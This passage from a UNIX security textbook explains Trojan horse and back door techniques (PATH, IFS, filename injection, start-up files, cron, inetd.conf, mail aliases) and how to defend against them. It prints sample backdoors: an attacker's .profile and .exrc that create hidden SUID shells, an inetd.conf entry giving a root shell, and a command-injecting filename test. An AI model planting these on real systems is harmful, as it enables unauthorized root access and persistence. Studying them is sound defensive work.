<html><head>
<title>[Chapter 11] 11.5 Protecting Yourself</TITLE>
<meta name="DC.title" content="Practical UNIX &amp; Internet Security"><meta name="DC.creator" content="Simson Garfinkel &amp; Gene Spafford"><meta name="DC.publisher" content="O'Reilly &amp; Associates, Inc."><meta name="DC.date" content="1999-02-04T00:08:22Z"><meta name="DC.type" content="Text.Monograph"><meta name="DC.format" content="text/html" scheme="MIME"><meta name="DC.source" content="1-56592-148-8" scheme="ISBN"><meta name="DC.language" content="en-US"><meta name="generator" content="Jade 1.1/O'Reilly DocBook 3.0 to HTML 4.0"><link rev="made" href="mailto:online-books@oreilly.com" title="Online Books Comments"><link rel="up" href="ch11_01.htm" title="11. Protecting Against Programmed Threats"><link rel="prev" href="ch11_04.htm" title="11.4 Entry"><link rel="next" href="ch11_06.htm#PUIS-CHP-11-SECT-6.1.2" title="11.6 Protecting Your System"></HEAD
><body bgcolor="#FFFFFF" text="#000000"><div class="htmlnav"><h1><img src="gifs/smbanner.gif" alt="Practical UNIX &amp; Internet Security" usemap="#srchmap" border="0"></H1
><map name="srchmap"index.html><area shape="RECT" coords="0,0,466,65" href="index.htm" alt="Practical UNIX &amp; Internet Security"><area shape="RECT" coords="467,0,514,18" href="../search/psrch.htm" alt="Search this book"></MAP
><table width="515" border="0" cellspacing="0" cellpadding="0"><tr><td align="LEFT" valign="TOP" width="172"><a class="SECT1" href="ch11_04.htm" title="11.4 Entry"><img src="../gifs/txtpreva.gif" alt="Previous: 11.4 Entry" border="0"></A
></TD
><td align="CENTER" valign="TOP" width="171"><b><font face="ARIEL,HELVETICA,HELV,SANSERIF" size="-1">Chapter 11<br>Protecting Against Programmed Threats</FONT
></B
></TD
><td align="RIGHT" valign="TOP" width="172"><a class="SECT1" href="ch11_06.htm#PUIS-CHP-11-SECT-6.1.2" title="11.6 Protecting Your System"><img src="../gifs/txtnexta.gif" alt="Next: 11.6 Protecting Your System" border="0"></A
></TD
></TR
></TABLE
>&nbsp;<hr align="LEFT" width="515" title="footer"></DIV
><div class="SECT1"><h2 class="sect1"><a class="title" name="PUIS-CHP-11-SECT-5">11.5 Protecting Yourself</A
></H2
><p class="para"><a class="indexterm" name="AUTOID-15131"></A
><a class="indexterm" name="AUTOID-15133"></A
><a class="indexterm" name="AUTOID-15136"></A
>The types of
programmed threats you are most likely to encounter in the <span class="acronym">UNIX</SPAN
>
environment are Trojan horses and back doors. In part, this is because
writing effective worms and viruses is difficult; also, attackers
do not intend outright damage to your system. Instead, they use
Trojan horses or back doors to gain (or regain) additional access
to your system. If damage is a goal, obtaining superuser access
is usually a first step in the process.</P
><p class="para"><a class="indexterm" name="AUTOID-15140"></A
>Some of the features that give
<span class="acronym">UNIX</SPAN
> flexibility and power also enable attackers
to craft workable Trojan horse or back door schemes.</P
><p class="para">In
general, attacks come in one of the following forms:</P
><ul class="itemizedlist"><li class="listitem"><p class="para">Altering the expected behavior of
the shell (command interpreter)</P
></LI
><li class="listitem"><p class="para">Abusing some form of start-up mechanism</P
></LI
><li class="listitem"><p class="para">Subverting some form of automatic mechanism</P
></LI
><li class="listitem"><p class="para">Exploiting unexpected interactions</P
></LI
></UL
><p class="para">All of these plans are designed basically to get a privileged
user or account to execute commands that would not normally be executed.
For example, one very common Trojan horse is a program named su
that, instead of making you the superuser, sends a copy of the superuser
password to an account at another computer.</P
><p class="para">To protect
your system effectively, you need to know how these attacks work.
By understanding the methods of attack, you can then be aware of
how to prevent them.</P
><p class="para">An equally important part of protecting
yourself is to run a secure system in general. Normal computer security
procedures will protect your system against both programmed threats
and malicious users.</P
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-11-SECT-5.1">11.5.1 Shell Features</A
></H3
><p class="para">The shells <a class="indexterm" name="AUTOID-15160"></A
><a class="indexterm" name="AUTOID-15163"></A
><a class="indexterm" name="AUTOID-15166"></A
><a class="indexterm" name="AUTOID-15169"></A
><a class="indexterm" name="AUTOID-15172"></A
>
<kbd class="command">(csh,
sh, ksh, tcsh,</KBD
> and others) provide users with a number of shortcuts
and conveniences. Among these features is a complete programming
language with variables. Some of these variables govern the behavior
of the shell itself. If an attacker is able to subvert the way the
shell of a privileged user works, the attacker can often get the
user (or a background task) to execute a task for him.</P
><p class="para">There
are a variety of common attacks using features of the shell to compromise
security. These are described in the following sections.</P
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.1.1">11.5.1.1 PATH attacks</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15179"></A
><a class="indexterm" name="AUTOID-15182"></A
>Each shell maintains
a path, consisting of a set of directories to be searched for commands
issued by the user. This set of directories is consulted, one at
a time, when the user types a command whose name does not contain
a / symbol, and which does not bind to an internal shell
command name or alias.</P
><p class="para">In the <a class="indexterm" name="AUTOID-15186"></A
>
Bourne and Korn shells, the <span class="acronym">PATH</SPAN
>
variable is normally set within the initialization file. The list
of directories given normally consists of directories, separated
by a colon (:). An entry of only a period, or an empty entry,[4]
means to search the current directory. The <kbd class="command">csh</KBD
> path is initialized
by setting the variable <span class="acronym">PATH</SPAN
> with a list of space-separated
directory names enclosed in parentheses.</P
><blockquote class="footnote"><p class="para">[4] In a POSIX system, a null entry does not translate to the
current directory; an explicit dot must be used.</P
></BLOCKQUOTE
><p class="para">For instance,
the following are typical initializations that have vulnerabilities:</P
><blockquote class="screen"><pre class="screen">PATH=.:/usr/bin:/bin:/usr/local/bin &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<kbd class="command">sh</KBD
> or <kbd class="command">ksh</KBD
>
set path = ( . /usr/bin /bin /usr/local/bin) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<kbd class="command">csh</KBD
></PRE
></BLOCKQUOTE
><p class="para">In the above, each command sets the search path to look first
in the current directory, then in <a class="indexterm" name="AUTOID-15200"></A
><a class="indexterm" name="AUTOID-15203"></A
><a class="indexterm" name="AUTOID-15206"></A
>
<i class="filename">/usr/bin,</I
> then in <i class="filename">/bin,</I
>
and then in <i class="filename">/usr/local/bin.</I
> This is a
poor choice of settings, especially if the user has special privileges.
The current directory, as designated by a null directory or period,
should never be included in the search path. To illustrate the danger
of placing the current directory in your path, see the example given
in &quot;Stealing Superuser&quot; in <a class="xref" href="ch04_01.htm" title="Users, Groups, and the Superuser">Chapter 4, <cite class="chapter">Users, Groups, and the Superuser</CITE
></A
>.</P
><p class="para">You
should also avoid this sort of initialization, which also places
the current directory in your search path:</P
><p class="para">Incorrect:</P
><blockquote class="screen"><pre class="screen">PATH=:/usr/bin:/bin:/usr/local/bin:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh or ksh</PRE
></BLOCKQUOTE
><p class="para">Correct:</P
><blockquote class="screen"><pre class="screen">PATH= /usr/bin:/bin:/usr/local/bin &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh or ksh</PRE
></BLOCKQUOTE
><p class="para">The colons (:) should <em class="emphasis">only</EM
>
be used as delimiters, not as end caps.</P
><p class="para">No sensitive
account should ever have the current directory in its search path.[5] This rule is especially true
of the superuser account! More generally, you should never have
a directory in your search path that is writable by other users.
Some sites keep a special directory, such as <i class="filename">/usr/local/bin/</I
>,
world-writable (mode 777) so that users can install programs for
the benefit of others. Unfortunately, this practice opens up the
entire system to the sort of attacks outlined earlier.</P
><blockquote class="footnote"><p class="para">[5] We would argue that no account should have the current directory
in its search path, but we understand how difficult this practice
would be to enforce.</P
></BLOCKQUOTE
><p class="para">Putting
the current directory last in the search path is also not a good
idea. For instance, if you use the <kbd class="command">more</KBD
> command frequently, but
sometimes type <kbd class="command">mroe</KBD
>, the attacker can take advantage of this by
placing a Trojan horse named <kbd class="command">mroe</KBD
> in this directory. It may be many
weeks or months before the command is accidentally executed. However,
when the command is executed, your security will be penetrated.</P
><p class="para">We strongly recommend that you get into the habit of typing
the full pathname of commands when you are running as <i class="filename">root</I
>. For
example, instead of only typing <kbd class="command">chown</KBD
>, type <i class="filename">/etc/chown</I
>
to be sure you are getting the system version! This may seem like
extra work, but when you are running as <i class="filename">root</I
>, you also bear extra
responsibility.</P
><p class="para">If you create any shell files that
will be run by a privileged user&nbsp;- including <i class="filename">root</I
>, <kbd class="command">uucp</KBD
>,
<kbd class="command">bin</KBD
>, etc.&nbsp;- get in the habit of resetting the <i class="filename">PATH</I
>
variable as one of the first things you do in each shell file. The
<i class="filename">PATH</I
> should include only sensible, protected
directories. This method is discussed further in <a class="xref" href="ch23_01.htm" title="Writing Secure SUID and Network Programs">Chapter 23, <cite class="chapter">Writing Secure SUID and Network Programs</CITE
></A
>.</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.1.2">11.5.1.2 IFS attacks</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15242"></A
><a class="indexterm" name="AUTOID-15245"></A
>The <span class="acronym">IFS</SPAN
>
variable can be set to indicate what characters separate input words
(similar to the <kbd class="command">-F</KBD
> option to awk). The benefit of this
variable is that you can use it to change the behavior of the shell
in interesting ways. For example, you could use the following shell
script to get a list of account names and their home directories:</P
><blockquote class="screen"><pre class="screen">#!/bin/sh

IFS=&quot;:&quot;

while read acct passwd uid gid gcos homedir shell
do
&nbsp;&nbsp;&nbsp;echo $acct &quot; &quot; $homedir
done &lt; /etc/passwd&#13;</PRE
></BLOCKQUOTE
><p class="para">(In
the example shown earlier, the shell has already read and parsed
the whole file before the assignment to <span class="acronym">IFS</SPAN
> is
executed, so the remaining words are not separated with colon (:)
characters.)</P
><p class="para"><a class="indexterm" name="AUTOID-15254"></A
><a class="indexterm" name="AUTOID-15256"></A
><a class="indexterm" name="AUTOID-15258"></A
><a class="indexterm" name="AUTOID-15261"></A
>The
<span class="acronym">IFS</SPAN
> feature has largely been superseded by other
tools, such as awk and Perl. However, the feature lives on and can
cause unexpected damage. By setting <span class="acronym">IFS</SPAN
> to use
/ as a separator, an attacker could cause a shell file
or program to execute unexpected commands, as described in <a class="xref" href="ch05_05.htm#PUIS-CHP-5-SECT-5.3.2" title="Another SUID example: IFS and the /usr/lib/preserve hole">Section 5.5.3.2, "Another SUID example: IFS and the /usr/lib/preserve
hole"</A
>.</P
><p class="para">Most modern versions of
the shell will reset their <span class="acronym">IFS</SPAN
> value to a normal
set of characters when invoked. Thus, shell files will behave properly.
However, not all do. To determine if your shell is immune to this
problem, try executing the following:</P
><blockquote class="screen"><pre class="screen">: A test of the shell

cd /tmp
cat &gt; tmp &lt;&lt;'E-O-F'
echo &quot;Danger!&quot;
echo &quot;Your shell does NOT reset the IFS variable!&quot;
E-O-F

cat &gt; foo &lt;&lt;&quot;E-O-F&quot;
echo &quot;Your shell appears well behaved.&quot;
E-O-F

cat &gt; test$$ &lt;&lt;&quot;E-O-F&quot;
/tmp/foo
E-O-F

chmod 700 tmp foo test$$

PATH=.:$PATH
IFS=&quot;/$IFS&quot;
export PATH IFS

test$$

rm -f tmp foo test$$&#13;</PRE
></BLOCKQUOTE
><p class="para">Failure to reset the <span class="acronym">IFS</SPAN
> variable is not
itself a security problem. The difficulty arises when a shell file
is executed on behalf of a user, or if some command is executed
from within a program using the system() or
popen() calls (they both use the shell to parse
and execute their arguments). If an attacker can execute the program
as a privileged user and reset the search path, then he can compromise
security. You should be especially cautious about writing shell
files and <span class="acronym">SUID/SGID</SPAN
> programs if your shell does
not reset <span class="acronym">IFS</SPAN
>.</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.1.3">11.5.1.3 $HOME attacks</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15277"></A
><a class="indexterm" name="AUTOID-15279"></A
><a class="indexterm" name="AUTOID-15282"></A
><a class="indexterm" name="AUTOID-15285"></A
>Yet another tactic that can be exploited,
in some circumstances, is to reset the <span class="acronym">HOME</SPAN
> variable.
Normally, the csh and ksh substitute the value of this variable
for the ~ symbol when it is used in pathnames. Thus, if an attacker
is able to change the value of this variable, he might also be able
to take advantage of a shell file that used the ~ symbol as a shorthand
for the home directory.</P
><p class="para">For example, if there is a
<span class="acronym">SUID</SPAN
> csh file (despite our warnings about both
csh and <span class="acronym">SUID</SPAN
> shell files) that references <i class="filename">~/.rhosts</I
>
for the user, an attacker could subvert it by resetting the <span class="acronym">HOME</SPAN
>
environment variable before running it.</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.1.4">11.5.1.4 Filename attacks</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15297"></A
><a class="indexterm" name="AUTOID-15299"></A
>One subtle form
of attack results from an interaction between the shell and the
filesystem. The <span class="acronym">UNIX</SPAN
> filesystem has no stipulations
on the characters that can be used in a filename, other than that
the slash (/) and null (<span class="acronym">ASCII</SPAN
> 0) character
cannot be used. Consequently, other special characters can be used,
including the following:</P
><p class="para">` ; | &amp;
$</P
><p class="para">The problem exists when a user finds that
some script or command is executed on a regular basis by a privileged
user, and the command uses filenames as an argument. If your attacker
should create a filename with the appropriate sequence of characters,
the attacker could execute a command of his or her choosing.</P
><p class="para">This problem most often manifests itself when there are scripts
run from the <a class="indexterm" name="AUTOID-15307"></A
><a class="indexterm" name="AUTOID-15309"></A
><a class="indexterm" name="AUTOID-15311"></A
>
cron
file to do filesystem sweeps or accounting. The commands most susceptible
to this form of attack are <kbd class="command">find</KBD
> and <kbd class="command">xargs</KBD
>,[6]
along with anything
that edits input and moves it to a shell. The following script demonstrates
all three and checks the versions of your programs to see if they
can be used in such an attack. If so, examine carefully any scripts
you run regularly.</P
><blockquote class="footnote"><p class="para">[6] The GNU <kbd class="command">find</KBD
> and
<kbd class="command">xargs</KBD
> programs have a <kbd class="command">-0</KBD
> option which causes the programs to use
the NULL character as the delimiter rather than the linefeed. The
use of this option protects these commands from filename attacks
of the variety described in this section.</P
></BLOCKQUOTE
><div class="example"><h4 class="example"><a class="title" name="PUIS-CHP-11-EX-1">Example 11.1: Command Test Script</A
></H4
><blockquote class="screen"><pre class="screen">: A Test of three basic commands

cd /tmp

if test -f ./gotcha
then
&nbsp;&nbsp;&nbsp;echo &quot;Ooops! There is already a file named gotcha here.&quot;
&nbsp;&nbsp;&nbsp;echo &quot;Delete it and try again.&quot;
&nbsp;&nbsp;&nbsp;exit 1
fi

cat &gt; gotcha &lt;&lt;E-O-F
echo &quot;Haha! Gotcha! If this was nasty, you would have a problem! 1&gt;&amp;2&quot;
touch g$$
exit 2
E-O-F
chmod +x ./gotcha

fname='foo;`gotcha`'
touch &quot;$fname&quot;

PATH=.:$PATH
export PATH

find /tmp -type f -exec echo {} \; &gt; /dev/null

if test -f ./g$$
then
&nbsp;&nbsp;&nbsp;echo &quot;Ooops! find gotcha!&quot;
&nbsp;&nbsp;&nbsp;rm -f g$$
else
&nbsp;&nbsp;&nbsp;echo &quot;find okay&quot;
fi

ls -1 * | sed 's/^/wc /' | sh &gt;/dev/null

if test -f ./g$$
then
&nbsp;&nbsp;&nbsp;echo &quot;Ooops! your shell gotcha!&quot;
&nbsp;&nbsp;&nbsp;rm -f g$$
else
&nbsp;&nbsp;&nbsp;echo &quot;your shell okay&quot;
fi

ls -1 | xargs ls &gt;/dev/null

if test -f ./g$$
then
&nbsp;&nbsp;&nbsp;echo &quot;Ooops! xargs gotcha!&quot;
&nbsp;&nbsp;&nbsp;rm -f g$$
else
echo &quot;xargs okay&quot;

fi

rm -f ./gotcha &quot;$fname&quot; g$$ <a class="indexterm" name="AUTOID-15323"></A
> </PRE
></BLOCKQUOTE
></DIV
></DIV
></DIV
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-11-SECT-5.2">11.5.2 Start-up File Attacks</A
></H3
><p class="para"><a class="indexterm" name="AUTOID-15328"></A
><a class="indexterm" name="AUTOID-15331"></A
><a class="indexterm" name="AUTOID-15334"></A
><a class="indexterm" name="AUTOID-15337"></A
>Various programs have methods
of automatic initialization to set options and variables for the
user. Once set, the user normally never looks at these again. As
a result, they are a great spot for an attacker to make a hidden
change to be executed automatically on her behalf.</P
><p class="para">The
problem is not that these start-up files exist, but that an attacker
may be able to write to them. All start-up files should be protected
so only the file's owner can write to them. Even having
group-write permission on these files may be dangerous.</P
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.2.1">11.5.2.1 .login, .profile, /etc/profile</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15344"></A
><a class="indexterm" name="AUTOID-15346"></A
><a class="indexterm" name="AUTOID-15348"></A
>These
files are executed when the user first logs in. Commands within
the files are executed by the user's shell. Allowing an
attacker to write to these files can result in arbitrary commands
being executed each time the user logs in, or on a one-time basis
(and hidden):</P
><blockquote class="screen"><pre class="screen">: attacker's version of root's .profile file
/bin/cp /bin/sh /tmp/.secret
/etc/chown root /tmp/.secret
/bin/chmod 4555 /tmp/.secret
: run real .profile and replace this file
mv /.real_profile /.profile
. /.profile</PRE
></BLOCKQUOTE
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.2.2">11.5.2.2 .cshrc, .kshrc</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15355"></A
><a class="indexterm" name="AUTOID-15357"></A
>These are files that can
be executed at login or when a new shell is run. They may also be
run after executing <kbd class="command">su</KBD
> to the user account.</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.2.3">11.5.2.3 GNU .emacs</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15363"></A
><a class="indexterm" name="AUTOID-15365"></A
><a class="indexterm" name="AUTOID-15367"></A
>This file is read and executed
when the <span class="acronym">GNU</SPAN
> Emacs editor is started. Commands
of arbitrary nature may be written in Emacs <span class="acronym">LISP</SPAN
>
code and buried within the user's Emacs start-up commands.
Furthermore, if any of the directories listed in the load-path variable
are writable, the library modules can be modified with similar results.</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.2.4">11.5.2.4 .exrc</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15375"></A
><a class="indexterm" name="AUTOID-15377"></A
><a class="indexterm" name="AUTOID-15379"></A
><a class="indexterm" name="AUTOID-15381"></A
><a class="indexterm" name="AUTOID-15384"></A
><a class="indexterm" name="AUTOID-15387"></A
>This
file is read for initialization when the ex or vi editor is started.
What is particularly nasty is that if there is a version of this
file present in the current directory, then its contents may be
read in and used in preference to the one in the user's
home directory.</P
><p class="para">Thus, an attacker might do the following
in every directory where he has write access:</P
><blockquote class="screen"><pre class="screen">% cat &gt; .exrc
!(cp /bin/sh /tmp/.secret;chmod 4755 /tmp/.secret)&amp;
^D</PRE
></BLOCKQUOTE
><p class="para">Should the superuser ever start either the <kbd class="command">vi</KBD
> or <kbd class="command">ex</KBD
> editor
in one of those directories, the superuser will unintentionally
create an <span class="acronym">SUID</SPAN
> <kbd class="command">sh</KBD
>. The superuser will notice
a momentary display of the ! symbol during editor start-up. The
attacker can then, at a later point, recover this <span class="acronym">SUID</SPAN
>
file and take full advantage of the system.</P
><p class="para">Some versions
of the <kbd class="command">vi/ex</KBD
> software allow you to put the command 
<kbd class="command">set noexrc</KBD
> in your EXINIT environment variable. This ability prevents
any local <i class="filename">.exrc</I
> file from being read and executed.</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.2.5">11.5.2.5 .forward, .procmailrc</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15405"></A
><a class="indexterm" name="AUTOID-15407"></A
><a class="indexterm" name="AUTOID-15409"></A
><a class="indexterm" name="AUTOID-15411"></A
>Some mailers allow the user to specify special
handling of mail by placing special files in their home directory.
With <kbd class="command">sendmail</KBD
>, the user may specify certain addresses and programs
in the <i class="filename">.forward</I
> file. If an attacker can write to this file, she
can specify that upon mail receipt a certain program be run&nbsp;- like
a shell script in /tmp that creates a <span class="acronym">SUID</SPAN
>
shell for the attacker.</P
><p class="para">Many popular mailer packages
allow users to write <i class="firstterm"><a class="indexterm" name="AUTOID-15419"></A
><a class="indexterm" name="AUTOID-15421"></A
><a class="indexterm" name="AUTOID-15423"></A
><a class="indexterm" name="AUTOID-15425"></A
>filter files</I
>
to process their mail in a semi-automated fashion. This includes
the <kbd class="command">procmail</KBD
> system, <kbd class="command">MH</KBD
>, <kbd class="command">elm</KBD
>,
and several others. Some of these programs are quite powerful, and
have the potential to cause problems on your system. If a user writes
a filter to trigger on a particular form of mail coming into the
mailbox, an attacker could craft a message to cause unwarranted
behavior.</P
><p class="para">For example, suppose that one of your users
has installed an autoreply to send an &quot;out-of-the-office&quot;
reply to any incoming mail. If someone with malicious intent were
to send a forged mail message with a bad return address, the hapless
user's mailer would send an automated reply. However, the
bad address would cause a bounce message to come back, only to trigger
another autoreply. The result is an endless exchange of autoreplies
and error messages, tying up network bandwidth (if non-local), log
file space, and disk space for the user. (The solution is to use
an autoreply that either sends a reply to each address only once
every few days, and that recognizes error messages. Unfortunately,
novice users, by definition, seldom think about how what they write
can go wrong.)</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.2.6">11.5.2.6 Other files</A
></H4
><p class="para">Other programs also have
initialization files that can be abused. Third-party systems that
you install on your system, such as database systems, office interfaces,
and windowing systems, all may have initialization files that can
cause problems if they are configured incorrectly or are writable.
You should carefully examine any initialization files present on
your system, and especially check their permissions.</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.2.7">11.5.2.7 Other initializations</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15437"></A
><a class="indexterm" name="AUTOID-15439"></A
>Many programs
allow you to set initialization values in environment variables
in your shell rather than in your files. These can also cause difficulties
if they are manipulated maliciously. For instance, in the above
example for <kbd class="command">vi</KBD
>, the Trojan horse can be planted in the EXINIT environment
variable rather than in a file. The attacker then needs to trick
the superuser into somehow sourcing a file or executing a shell
file that sets the environment variable and then executes the editor.
Be very wary of any circumstances where you might alter one of your
shell variables in this way!</P
><p class="para"><a class="indexterm" name="AUTOID-15444"></A
><a class="indexterm" name="AUTOID-15446"></A
><a class="indexterm" name="AUTOID-15448"></A
><a class="indexterm" name="AUTOID-15450"></A
><a class="indexterm" name="AUTOID-15452"></A
><a class="indexterm" name="AUTOID-15455"></A
><a class="indexterm" name="AUTOID-15458"></A
><a class="indexterm" name="AUTOID-15461"></A
>Another possible source of initialization
errors comes into play when you edit files that have embedded edit
commands. Both <kbd class="command">vi/ex</KBD
> and Emacs allow you to embed editor
commands within text files so they are automatically executed whenever
you edit the file. For this to work, they must be located in the
first few or last few lines of the file.</P
><p class="para">To disable
this feature in Emacs, place one of these lines in your .emacs file:</P
><blockquote class="screen"><pre class="screen">(setq inhibit-local-variables t)										; emacs version 18</PRE
></BLOCKQUOTE
><p class="para">or:</P
><blockquote class="screen"><pre class="screen">(setq enable-local-variables &quot;ask&quot;)										; emacs verison 19 and above</PRE
></BLOCKQUOTE
><p class="para">We know of no uniform
method of disabling the undesired behavior of vi/ex on
every platform without making alterations to the source. Some vendors
may have provided a means of shutting off this automatic initialization,
so check your documentation.<a class="indexterm" name="AUTOID-15470"></A
><a class="indexterm" name="AUTOID-15473"></A
><a class="indexterm" name="AUTOID-15476"></A
><a class="indexterm" name="AUTOID-15479"></A
></P
></DIV
></DIV
><div class="sect2"><h3 class="sect2"><a class="title" name="PUIS-CHP-11-SECT-5.3">11.5.3 Abusing Automatic Mechanisms</A
></H3
><p class="para"><span class="acronym">UNIX</SPAN
>
<a class="indexterm" name="AUTOID-15486"></A
><a class="indexterm" name="AUTOID-15489"></A
>
has programs
and systems that run automatically. Many of these systems require
special privileges. If an attacker can compromise these systems,
he may be able to gain direct unauthorized access to other parts
of the operating system, or to plant a back door to gain access
at a later time.</P
><p class="para">In general, there are three principles
to preventing abuse of these automatic systems:</P
><ol class="orderedlist"><li class="listitem"><p class="para">Don't run anything in the
background or periodically with any more privileges than absolutely
necessary.</P
></LI
><li class="listitem"><p class="para">Don't have <a class="indexterm" name="AUTOID-15498"></A
>
configuration
files for these systems writable by anyone other than the superuser.
Consider making them unreadable, too.</P
></LI
><li class="listitem"><p class="para">When adding anything new to the system that will
be run automatically, keep it simple and test it as thoroughly as
you can.</P
></LI
></OL
><p class="para">The first principle
suggests that if you can run something in the background with a
user ID other than root, you should do so. For instance, the <a class="indexterm" name="AUTOID-15504"></A
><a class="indexterm" name="AUTOID-15507"></A
>
uucp and
Usenet cleanup scripts that are usually executed on a nightly basis
should be run from the uucp and news <span class="acronym">UID</SPAN
>s, rather
than as the superuser. Those shell files and their directories should
all be protected so that they are unwritable by other users. In
this way, an attacker can't modify the files and insert
commands that will be automatically executed at a later time.</P
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.3.1">11.5.3.1 crontab entries</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15514"></A
>There
are three forms of <i class="filename">crontab</I
> files. The oldest form has a line with
a command to be executed as superuser whenever the time field is
matched by the <kbd class="command">cron</KBD
> daemon.[7]
To execute commands from this old-style <i class="filename">crontab</I
> file as a user other
than root, it is necessary to make the command listed in the <i class="filename">crontab</I
>
file use the <kbd class="command">su</KBD
> command. For example:</P
><blockquote class="footnote"><p class="para">[7] All crontab files are
structured with five fields (minutes, hours, days, months, day of
week) indicating the time at which to run the command.</P
></BLOCKQUOTE
><blockquote class="screen"><pre class="screen">59 1 * * *				su news -c /usr/lib/news/news.daily</PRE
></BLOCKQUOTE
><p class="para">This has the effect of running the <kbd class="command">su</KBD
> command at 1:59 a.m.,
resulting in a shell running as user news. The shell is given arguments
of both <kbd class="command">-c</KBD
> and <i class="filename">/usr/lib/news/news.daily</I
>
that then cause the script to be run as a command.</P
><p class="para">The
second form of the <i class="filename">cron</I
> file has an extra field
that indicates on whose behalf the command is being run. Below,
the script is run at 1:59 a.m. as user news without the need for
a <kbd class="command">su</KBD
> command. This version of <i class="filename">cron </I
>is found
principally in versions of <span class="acronym">UNIX</SPAN
> derived from
the older <span class="acronym">BSD</SPAN
> version:</P
><blockquote class="screen"><pre class="screen">59 1 * * *				news			/usr/lib/news/news.daily</PRE
></BLOCKQUOTE
><p class="para">The third form of <kbd class="command">cron</KBD
> is found in System V systems, and later
versions of <span class="acronym">BSD</SPAN
>-derived <span class="acronym">UNIX</SPAN
>.
It keeps a protected directory with a separate <i class="filename">crontab</I
> file for
each user. The <kbd class="command">cron</KBD
> daemon examines all the files and dispatches
jobs based on the user owning the file. This form of <kbd class="command">cron</KBD
> does not
need any special care in the entries, although (like the other two
versions) the files and directories need to be kept protected.</P
><p class="para">A freely redistributable version of <kbd class="command">cron</KBD
> that has this third
type of behavior is available on many <span class="acronym">FTP</SPAN
> sites
(be sure to get the latest version). It was written by Paul Vixie
and is available for anyone who wants to use it for noncommercial
purposes. If you are stuck with the oldest form of <kbd class="command">cron</KBD
>, we suggest
that you consider obtaining Paul's version to replace yours.</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.3.2">11.5.3.2 inetd.conf</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15549"></A
>The
<i class="filename">/etc/inetd.conf</I
> file defines what programs should
be run when incoming network connections are caught by the <kbd class="command">inetd</KBD
>
daemon. An intruder who can write to the file may change one of
the entries in the file to start up a shell or other program to
access the system upon receipt of a message. So, he might change:</P
><blockquote class="screen"><pre class="screen">daytime stream tcp nowait root internal</PRE
></BLOCKQUOTE
><p class="para">to:</P
><blockquote class="screen"><pre class="screen">daytime stream tcp nowait root /bin/ksh ksh -i</PRE
></BLOCKQUOTE
><p class="para">This would allow an attacker to <kbd class="command">telnet</KBD
>
to the <i class="filename">daytime</I
> port on the machine, and get a root shell any time
he wanted to get back on the machine. Note that this would not result
in any unusual program appearing on the system. The only way to
discover this trap is to include the<i class="filename"> inetd.conf</I
>
file. Obviously, this is a file to include as part of the checklists
procedure for examining altered files. It is also a file that should
be closely guarded.</P
><p class="para">Note that even if the command names
look appropriate for each of the services listed in the <i class="filename">inetd.conf</I
>
file, if the corresponding files are writable or in a writable directory,
the attacker may replace them with altered versions. They would
not need to be <span class="acronym">SUID/SGID</SPAN
> because the <kbd class="command">inetd</KBD
> would
run them as <i class="filename">root</I
> (if so indicated in the file).</P
></DIV
><div class="sect3"><h4 class="sect3"><a class="title" name="PUIS-CHP-11-SECT-5.3.3">11.5.3.3 /usr/lib/aliases, /etc/aliases,
/etc/sendmail/aliases, aliases.dir, or
aliases.pag</A
></H4
><p class="para"><a class="indexterm" name="AUTOID-15568"></A
><a class="indexterm" name="AUTOID-15571"></A
><a class="indexterm" name="AUTOID-15574"></A
><a class="indexterm" name="AUTOID-15576"></A
><a class="indexterm" name="AUTOID-15579"></A
><a class="indexterm" name="AUTOID-15581"></A
>This
is the <a class="indexterm" name="AUTOID-15584"></A
><a class="indexterm" name="AUTOID-15587"></A
>
file of system-wide electronic
mail aliases used by the <kbd class="command">sendmail</KBD
> program. Similar files exist for
other mailers.</P
><p class="para">The danger with this file is that an
attacker can create a mail alias that automatically runs a particular
program. For example, an attacker might add an alias that looks
like this:</P
><blockquote class="screen"><pre class="screen">uucheck: &quot;|/usr/lib/uucp/local_uucheck&quot;</PRE
></BLOCKQUOTE
><p class="para">He might then create a <span class="acronym">SUID</SPAN
> root file called
<i class="filename">/usr/lib/uucp/local_uucheck</I
>
that essentially performs these operations:[8]</P
><blockquote class="footnote"><p class="para">[8] An actual
